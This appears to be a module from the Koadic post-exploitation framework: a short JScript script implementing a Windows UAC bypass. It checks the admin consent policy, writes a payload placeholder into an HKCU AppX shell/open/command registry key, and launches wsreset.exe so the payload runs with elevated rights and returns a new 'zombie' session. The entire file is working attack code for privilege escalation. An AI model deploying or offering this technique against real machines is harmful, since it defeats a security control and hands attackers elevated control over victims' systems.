
try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = Koadic.registry.read(Koadic.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", Koadic.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }

    var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);

    Koadic.shell.run("C:\\Windows\\System32\\wsreset.exe", true);

    Koadic.work.report("Completed");
    // It's slow, if we clean up we don't get the new zombie!!!!!
    // var now = new Date().getTime();
    // while (new Date().getTime() < now + 30000);

    // if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "") != 0)
    // {
    //     Koadic.shell.run("reg delete HKCU\\"+path+" /f", true);
    // }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
